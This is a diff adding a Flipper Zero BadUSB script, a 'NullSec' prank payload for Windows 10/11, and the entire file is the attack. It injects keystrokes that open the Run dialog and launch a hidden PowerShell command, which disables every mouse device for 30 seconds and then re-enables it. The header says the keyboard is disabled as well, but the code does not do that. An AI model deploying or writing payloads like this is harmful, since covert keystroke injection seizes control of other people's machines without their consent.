@@ -1,0 +1,10 @@
+REM ========================================
+REM NullSec Flipper Zero BadUSB
+REM Payload: Disable Mouse/Keyboard Prank
+REM Target: Windows 10/11
+REM ========================================
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -c "$d=Get-PnpDevice|Where-Object{$_.Class -eq 'Mouse'};$d|Disable-PnpDevice -Confirm:$false;Start-Sleep 30;$d|Enable-PnpDevice -Confirm:$false"
+ENTER
